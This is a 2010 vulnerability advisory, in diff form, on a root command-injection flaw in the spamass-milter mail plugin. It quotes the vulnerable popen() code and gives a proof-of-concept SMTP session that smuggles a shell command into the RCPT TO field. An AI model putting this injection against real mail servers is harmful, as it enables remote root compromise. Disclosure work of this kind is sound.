@@ -1,0 +1,120 @@
+Description: The Spamassassin Milter plugin suffers from a remote root command execution vulnerability. Full exploit details provided.
+Author:	Kingcope
+
+Spamassassin Milter Plugin Remote Root Zeroday (BTW zerodays lurk in the
+shadows not HERE)
+aka the postfix_joker advisory
+
+Logic fuckup?
+
+March 07 2010 // if you read this 10 years later you are definetly
+seeking the nice 0days!
+
+Greetz fly out to alex,andi,adize :D
++++ KEEP IT ULTRA PRIV8 +++
+
+Software
++-+-+-+-+
+Apache Spamassassin
+SpamAssassin is a mail filter which attempts to identify spam using
+a variety of mechanisms including text analysis, Bayesian filtering,
+DNS blocklists, and collaborative filtering databases.
+
+SpamAssassin is a project of the Apache Software Foundation (ASF).
+
+Postfix
+What is Postfix? It is Wietse Venema's mailer that started life at IBM
+research as an alternative to the widely-used Sendmail program.
+Postfix attempts to be fast, easy to administer, and secure.
+The outside has a definite Sendmail-ish flavor, but the inside is
+completely different.
+
+Spamassassin Milter
+A little plugin for the Sendmail Milter (Mail Filter) library
+that pipes all incoming mail (including things received by rmail/UUCP)
+through the SpamAssassin, a highly customizable SpamFilter.
+
+Remote Code Execution Vulnerability
++-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+
+The Spamassassin Milter Plugin can be tricked into executing any command
+as the root user remotely.
+If spamass-milter is run with the expand flag (-x option) it runs a
+popen() including the attacker supplied 
+recipient (RCPT TO).
+
+>From spamass-milter-0.3.1 (-latest) Line 820:
+
+//
+// Gets called once for each recipient
+//
+// stores the first recipient in the spamassassin object and
+// stores all addresses and the number thereof (some redundancy)
+//
+
+sfsistat
+mlfi_envrcpt(SMFICTX* ctx, char** envrcpt)
+{
+        struct context *sctx = (struct context*)smfi_getpriv(ctx);
+        SpamAssassin* assassin = sctx->assassin;
+        FILE *p;
+#if defined(__FreeBSD__)
+        int rv;
+#endif
+
+        debug(D_FUNC, "mlfi_envrcpt: enter");
+
+        if (flag_expand)
+        {
+                /* open a pipe to sendmail so we can do address
+expansion */
+
+                char buf[1024];
+                char *fmt="%s -bv \"%s\" 2>&1";
+
+#if defined(HAVE_SNPRINTF)
+                snprintf(buf, sizeof(buf)-1, fmt, SENDMAIL, envrcpt[0]);
+#else
+                /* XXX possible buffer overflow here // is this a
+joke ?! */
+                sprintf(buf, fmt, SENDMAIL, envrcpt[0]);
+#endif
+
+                debug(D_RCPT, "calling %s", buf);
+
+#if defined(__FreeBSD__) /* popen bug - see PR bin/50770 */
+                rv = pthread_mutex_lock(&popen_mutex);
+                if (rv)
+                {
+                        debug(D_ALWAYS, "Could not lock popen mutex: %
+s", strerror(rv));
+                        abort();
+                }
+#endif
+
+                p = popen(buf, "r");				[1]
+                if (!p)
+                {
+                        debug(D_RCPT, "popen failed(%s).  Will not
+expand aliases", strerror(errno));
+                        assassin->expandedrcpt.push_back(envrcpt[0]);
+
+
+[1] the vulnerable popen() call.
+
+Remote Root Exploit PoC through postfix
++-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+
+$ nc localhost 25
+220 ownthabox ESMTP Postfix (Ubuntu)
+mail from: me@me.com
+250 2.1.0 Ok
+rcpt to: root+:"|touch /tmp/foo"
+250 2.1.5 Ok
+
+$ ls -la /tmp/foo
+-rw-r--r-- 1 root root 0 2010-03-07 19:46 /tmp/foo
+
+Signed,
+
+Kingcope
